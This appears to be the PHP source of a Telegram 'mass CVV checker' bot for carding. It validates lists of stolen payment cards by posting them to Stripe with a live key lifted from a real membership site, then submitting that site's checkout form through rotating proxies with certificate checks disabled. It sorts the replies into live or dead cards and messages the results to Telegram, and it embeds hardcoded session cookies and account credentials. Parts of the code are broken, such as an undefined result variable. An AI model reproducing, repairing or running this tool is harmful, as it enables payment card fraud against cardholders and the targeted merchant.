<?php



if ($_SERVER['REQUEST_METHOD'] == "POST") {

    extract($_POST);

} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {

    extract($_GET);

}

//====================FUNCTION END===============//

if (strpos($message, "/mass") === 0 || strpos($message, "!mass") === 0 || strpos($message, ".mass") === 0) {

    $message = substr($message,6);

if (empty($message)){

exit();

}

$stchk = "<b>Started Checking...</b>";

    $sendmes = "https://api.telegram.org/bot".$botToken."/sendMessage?chat_id=".$chatId."&text=".$stchk."&reply_to_message_id=".$message_id."&parse_mode=HTML";

    $sent = json_decode(file_get_contents($sendmes) ,1);

    global $mes_id;

    $mes_id = $sent['result']['message_id'];

    sleep(1);

    $aray = gibarray($message);

    $cout = count($aray);

    $total = $cout * 15;

    if (count($aray) > 10){

  $cmsg = "𝗧𝗛𝗜𝗦 𝗚𝗔𝗧𝗘 𝗜𝗦 𝗟𝗜𝗠𝗜𝗧𝗘𝗗 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 𝗙𝗢𝗥 𝟭𝟬 𝗖𝗖 𝗢𝗡𝗟𝗬 ⚠️";

  editMessage($chatId,$cmsg,$mes_id);

    exit();

}

    else{

      global $fullmes;

      $fullmes = '';

    //echo '<pre>'; print_r($aray); echo '</pre>';

      foreach ($aray as $cc){

    //echo "Checking : $cc <br>";

        $check = chemker1($cc);

    //echo "Result For $cc : $result<hr>";

      }

    }

}



function chemker1($lista){



  $email = "Broken@gmail.com";

  ///-----------------------CC PARSE -----------------------///

$separa = explode("|", $lista);

$cc = $separa[0];

$mes = $separa[1];

$ano = $separa[2];

$cvv = $separa[3];



  $ch = curl_init();

  curl_setopt($ch, CURLOPT_PROXY, $socks5);

  curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);

  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');

  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

  curl_setopt($ch, CURLOPT_POST, 1);

  $headers = array();

  $headers[] = 'Host: api.stripe.com';

  $headers[] = 'Accept: application/json';

  $headers[] = 'Accept-Language: en-US,en;q=0.8';

  $headers[] = 'Content-Type: application/x-www-form-urlencoded';

  $headers[] = 'Path: /v1/payment_methods';

  $headers[] = 'Origin: https://js.stripe.com';

  $headers[] = 'Referer: https://js.stripe.com/';

  $headers[] = 'sec-ch-ua: "Not/A)Brand";v="99", "Microsoft Edge";v="115", "Chromium";v="115"';

  $headers[] = 'sec-ch-ua-mobile: ?0';

  $headers[] = 'sec-ch-ua-platform: "Windows"';

  $headers[] = 'Sec-Fetch-Dest: empty';

  $headers[] = 'Sec-Fetch-Mode: cors';

  $headers[] = 'Sec-Fetch-Site: same-site';

  $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188';

  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

  curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=e6de2d6e-b274-4446-bf7c-2ddc40b41aea5641ba&muid=5b822e84-caae-41de-8a32-c54d05c25b9e3ef89a&sid=69a97df0-8b95-4902-9eab-80f20f1758e24e759d&pasted_fields=number&payment_user_agent=stripe.js%2F7e8ee2cfca%3B+stripe-js-v3%2F7e8ee2cfca%3B+split-card-element&referrer=https%3A%2F%2Fwww.yasminmogahedtv.com&time_on_page=79353&key=pk_live_51HdbmyHNc8MTJAaGytBzUdQLnsyVtugsmpGoxyN6NwE9ip5CsvYgmwAgxB5JBcyGnORmoxbtZzdvMl4AN6TwejOX00t0lGfzmO');



  $result1 = curl_exec($ch);

  $id = trim(strip_tags(getStr($result1,'"id": "','"')));

  $brandi = trim(strip_tags(getStr($result1,'"brand": "','"')));



  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');

  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');



    $ch = curl_init();

  curl_setopt($ch, CURLOPT_PROXY, $socks5);

  curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);

  curl_setopt($ch, CURLOPT_URL, 'https://www.yasminmogahedtv.com/membership-account/membership-checkout/');

  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

  curl_setopt($ch, CURLOPT_HEADER, 0);

  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');

  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

              curl_setopt($ch, CURLOPT_POST, 1);

  $headers = array(

    'authority: www.yasminmogahedtv.com',

    'method: POST',

    'path: /membership-account/membership-checkout/ HTTP/1.1',

    'scheme: https',

    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',

    'accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',

    'cnntent-Type: application/x-www-form-urlencoded',

    'cookie: PHPSESSID=qcpqv2lku3sqateclj8lh93bb0; pmpro_visit=1; __stripe_mid=5b822e84-caae-41de-8a32-c54d05c25b9e3ef89a; __stripe_sid=69a97df0-8b95-4902-9eab-80f20f1758e24e759d',

    'origin: https://www.yasminmogahedtv.com',

    'referer: https://www.yasminmogahedtv.com/membership-account/membership-checkout/',

    'sec-Fetch-Dest: document',

    'sec-Fetch-Mode: navigate',

    'sec-Fetch-Site: same-origin',

    'user-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',

    );

  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

  curl_setopt($ch, CURLOPT_POSTFIELDS, "level=4&checkjavascript=1&other_discount_code=&username=abhyyannoe&password=abhyan3434&password2=abhyan3434&bemail=brookenn%40gmail.com&bconfirmemail=brookenn%40gmail.com&fullname=&telephone=09632581470&CardType=visa&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id=pm_1OQqg9HNc8MTJAaGpmFyVYkl&AccountNumber=XXXXXXXXXXXX9757&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'");





  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');

  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');



  $result2 = curl_exec($ch);

  $msg = trim(strip_tags(getStr($result2,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));





if ((strpos($result2a, 'incorrect_zip')) || (strpos($result2a, 'Your card zip code is incorrect.')) || (strpos($result2a, 'The zip code you supplied failed validation.'))){

      $status = "Live 🟡";

      $response = "Zip Mismatch ❎";

    }





elseif (strpos($result2a, "CVV LIVE")){

  $status = "Live 🟢";

$response = "CVV Matched ✅";

  }

elseif ((strpos($result2a, "INSUFFICIENT FUNDS")) || (strpos($result2a, "insufficient_funds"))){

  $status = "CVV Live 🟢";

$response = "INSUFFICIENT FUNDS ✅";



  }

elseif ((strpos($result2a, "CCN LIVE")) || (strpos($result2a, "incorrect_cvc")) || (strpos($result2a, "The card's security code is incorrect."))){

  $status = "Live 🟡";

$response = "CCN Live ❎";



  }

elseif ((strpos($result2a, "TRANSACTION NOT ALLOWED")) || (strpos($result2a, "transaction_not_allowed"))){

  $status = "Live 🟡";

$response = "TRANSACTION NOT ALLOWED";



  }



elseif (strpos($result2a, "DO NOT HONOR")){



$status = "Dead 🔴";

$response = "DO NOT HONOR 🚫";

}



elseif (strpos($result2a, "stolen_card")){



$status = "Dead 🔴";

$response = "Stolen Card 🚫";

}



elseif (strpos($result2a, "lost_card")){

  $status = "Dead 🔴";

$response = "Lost Card 🚫";

}





elseif (strpos($result2a, "PICKUP CARD")){

  $status = "Dead 🔴";

$response = "PICKUP CARD";

}





elseif ((strpos($result2a, 'INCORRECT CARD NUMBER')) || (strpos($result2a, 'Your card number is incorrect.')) || (strpos($result2a, 'incorrect_number'))){



  $status = "Dead 🔴";

$response = "Incorrect Card Number 🚫";

}





elseif ((strpos($result2a, 'Your card has expired.')) || (strpos($result2a, 'expired_card'))){

  $status = "Dead 🔴";

$response = "Expired Card 🚫";



  }





elseif (strpos($result2a, '"status":"success"')){

  $status = "Live 🟢";

$response = "Charged 1$";



  }





elseif (strpos($result2a, "FRAUDULENT")){

  $status = "Dead 🔴";

$response = "Fraudulent 🚫";

}





elseif (strpos($result2a, "lock_timeout")){

  $status = "Dead 🔴";

$response = "error 404 🚫";

}





elseif ((strpos($result2a, "Your card was declined.")) || (strpos($result2a, 'The card was declined.'))){

  $status = "Dead 🔴";

$response = "Generic Decline 🚫";

}





elseif (strpos($result2a, "NVAILD EXPIRY MONTH")){

  $status = "Dead 🔴";

$response = "NVAILD EXPIRY MONTH 😥";

}







elseif (strpos($result2a, "Error processing payment")){

  $status = "Dead 🔴";

$response = "Error processing payment";

}



elseif (strpos($result2a, 'CARD NOT SUPPORTED')){

  $status = "Live 🟡";

$response = "CARD NOT SUPPORTED 🚫";

}





elseif (strpos($result2a, "parameter_invalid_empty")){

  $status = "Dead 🔴";

$response = "404 error 🚫";

}



else {

      $status = "Dead 🔴";

$response = "$msg";



    }

//--------SMS SENT SECTION----------------//

  global $mes_id, $chatId , $fullmes;

$mainulstatus = "<b>Dead 🔴</b>";

$fullmes = $fullmes.'<b>CC - <code>'.$lista.'</code>

Result - '.$response.'</b>



';

$umass = "<b>𒀭  MASS CVV CHARGE 1 $  𒀭

   ━━━━━━━━━━━━━</b>

";

$fmass = "<b>╭───────────────

𒆜 PROXY  : [ LIVE & ROTATING ]

𒆜 BOT BY : <a href='t.me/spidey09'>[ TEAM SPIDEY ]</a>

╰───────────────✘</b>";



$mallmsg = urlencode ("$umass

$fullmes

$fmass");

editMessagei($chatId,$mallmsg,$mes_id);



}